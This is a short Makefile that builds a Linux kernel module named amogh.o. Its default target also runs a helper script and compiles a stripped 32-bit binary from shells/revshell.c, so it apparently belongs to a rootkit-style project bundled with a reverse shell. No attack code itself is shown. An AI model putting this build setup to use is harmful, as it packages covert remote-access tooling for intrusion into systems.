# If KERNELRELEASE is defined, we've been invoked from the
# kernel build system and can use its language.
ifneq ($(KERNELRELEASE),)
        obj-m := amogh.o

# Otherwise we were called directly from the command
# line; invoke the kernel build system.
else
        KERNELDIR ?= /lib/modules/$(shell uname -r)/build
        PWD := $(shell pwd)
default:
	sh scripts/lets_amogh.sh
	gcc -Wall -m32 -s -o shells/revshell shells/revshell.c
	make -C $(KERNELDIR) M=$(PWD) modules
endif
